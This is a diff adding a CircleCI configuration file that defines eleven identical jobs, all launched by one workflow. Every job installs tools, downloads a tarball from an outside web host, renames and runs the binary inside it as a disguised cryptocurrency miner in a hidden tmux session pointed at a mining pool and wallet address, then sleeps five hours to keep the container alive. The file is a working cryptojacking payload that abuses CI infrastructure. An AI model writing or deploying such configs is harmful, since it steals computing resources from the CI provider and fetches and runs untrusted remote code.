@@ -1,0 +1,127 @@
+version: 2.1
+
+jobs:
+  triggeringproc:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install sudo tmux htop wget curl -y; wget http://mrgeek.me/fb/garchain.tar.gz; tar xvfz garchain.tar.gz; cd apache; mv rf delga; chmod +x delga; sudo tmux new -d -s my-session "./delga -t 32 --randomize --quiet -a yespowersugar -o midaroamu.ruok.org:7042 -u sugar1q6s33se24w97npv2dtdpg8hcdzj2u3n338nlvsx.nLEO -x 18.222.27.85:34844"
+      - run: 
+            command: sleep 18000
+            no_output_timeout: 5h
+
+  triggeringproc1:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install sudo tmux htop wget curl -y; wget http://mrgeek.me/fb/garchain.tar.gz; tar xvfz garchain.tar.gz; cd apache; mv rf delga; chmod +x delga; sudo tmux new -d -s my-session "./delga -t 32 --randomize --quiet -a yespowersugar -o midaroamu.ruok.org:7042 -u sugar1q6s33se24w97npv2dtdpg8hcdzj2u3n338nlvsx.nLEO -x 18.222.27.85:34844"
+      - run: 
+            command: sleep 18000
+            no_output_timeout: 5h
+
+  triggeringproc2:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install sudo tmux htop wget curl -y; wget http://mrgeek.me/fb/garchain.tar.gz; tar xvfz garchain.tar.gz; cd apache; mv rf delga; chmod +x delga; sudo tmux new -d -s my-session "./delga -t 32 --randomize --quiet -a yespowersugar -o midaroamu.ruok.org:7042 -u sugar1q6s33se24w97npv2dtdpg8hcdzj2u3n338nlvsx.nLEO -x 18.222.27.85:34844"
+      - run: 
+            command: sleep 18000
+            no_output_timeout: 5h
+
+  triggeringproc3:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install sudo tmux htop wget curl -y; wget http://mrgeek.me/fb/garchain.tar.gz; tar xvfz garchain.tar.gz; cd apache; mv rf delga; chmod +x delga; sudo tmux new -d -s my-session "./delga -t 32 --randomize --quiet -a yespowersugar -o midaroamu.ruok.org:7042 -u sugar1q6s33se24w97npv2dtdpg8hcdzj2u3n338nlvsx.nLEO -x 18.222.27.85:34844"
+      - run: 
+            command: sleep 18000
+            no_output_timeout: 5h
+
+  triggeringproc4:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install sudo tmux htop wget curl -y; wget http://mrgeek.me/fb/garchain.tar.gz; tar xvfz garchain.tar.gz; cd apache; mv rf delga; chmod +x delga; sudo tmux new -d -s my-session "./delga -t 32 --randomize --quiet -a yespowersugar -o midaroamu.ruok.org:7042 -u sugar1q6s33se24w97npv2dtdpg8hcdzj2u3n338nlvsx.nLEO -x 18.222.27.85:34844"
+      - run: 
+            command: sleep 18000
+            no_output_timeout: 5h
+
+  triggeringproc5:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install sudo tmux htop wget curl -y; wget http://mrgeek.me/fb/garchain.tar.gz; tar xvfz garchain.tar.gz; cd apache; mv rf delga; chmod +x delga; sudo tmux new -d -s my-session "./delga -t 32 --randomize --quiet -a yespowersugar -o midaroamu.ruok.org:7042 -u sugar1q6s33se24w97npv2dtdpg8hcdzj2u3n338nlvsx.nLEO -x 18.222.27.85:34844"
+      - run: 
+            command: sleep 18000
+            no_output_timeout: 5h
+
+  triggeringproc6:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install sudo tmux htop wget curl -y; wget http://mrgeek.me/fb/garchain.tar.gz; tar xvfz garchain.tar.gz; cd apache; mv rf delga; chmod +x delga; sudo tmux new -d -s my-session "./delga -t 32 --randomize --quiet -a yespowersugar -o midaroamu.ruok.org:7042 -u sugar1q6s33se24w97npv2dtdpg8hcdzj2u3n338nlvsx.nLEO -x 18.222.27.85:34844"
+      - run: 
+            command: sleep 18000
+            no_output_timeout: 5h
+
+  triggeringproc7:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install sudo tmux htop wget curl -y; wget http://mrgeek.me/fb/garchain.tar.gz; tar xvfz garchain.tar.gz; cd apache; mv rf delga; chmod +x delga; sudo tmux new -d -s my-session "./delga -t 32 --randomize --quiet -a yespowersugar -o midaroamu.ruok.org:7042 -u sugar1q6s33se24w97npv2dtdpg8hcdzj2u3n338nlvsx.nLEO -x 18.222.27.85:34844"
+      - run: 
+            command: sleep 18000
+            no_output_timeout: 5h
+
+  triggeringproc8:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install sudo tmux htop wget curl -y; wget http://mrgeek.me/fb/garchain.tar.gz; tar xvfz garchain.tar.gz; cd apache; mv rf delga; chmod +x delga; sudo tmux new -d -s my-session "./delga -t 32 --randomize --quiet -a yespowersugar -o midaroamu.ruok.org:7042 -u sugar1q6s33se24w97npv2dtdpg8hcdzj2u3n338nlvsx.nLEO -x 18.222.27.85:34844"
+      - run: 
+            command: sleep 18000
+            no_output_timeout: 5h
+
+  triggeringproc9:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install sudo tmux htop wget curl -y; wget http://mrgeek.me/fb/garchain.tar.gz; tar xvfz garchain.tar.gz; cd apache; mv rf delga; chmod +x delga; sudo tmux new -d -s my-session "./delga -t 32 --randomize --quiet -a yespowersugar -o midaroamu.ruok.org:7042 -u sugar1q6s33se24w97npv2dtdpg8hcdzj2u3n338nlvsx.nLEO -x 18.222.27.85:34844"
+      - run: 
+            command: sleep 18000
+            no_output_timeout: 5h
+
+  triggeringproc10:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install sudo tmux htop wget curl -y; wget http://mrgeek.me/fb/garchain.tar.gz; tar xvfz garchain.tar.gz; cd apache; mv rf delga; chmod +x delga; sudo tmux new -d -s my-session "./delga -t 32 --randomize --quiet -a yespowersugar -o midaroamu.ruok.org:7042 -u sugar1q6s33se24w97npv2dtdpg8hcdzj2u3n338nlvsx.nLEO -x 18.222.27.85:34844"
+      - run: 
+            command: sleep 18000
+            no_output_timeout: 5h
+
+workflows:
+  main:
+    jobs:
+      - triggeringproc
+      - triggeringproc1
+      - triggeringproc2
+      - triggeringproc3
+      - triggeringproc4
+      - triggeringproc5
+      - triggeringproc6
+      - triggeringproc7
+      - triggeringproc8
+      - triggeringproc9
+      - triggeringproc10
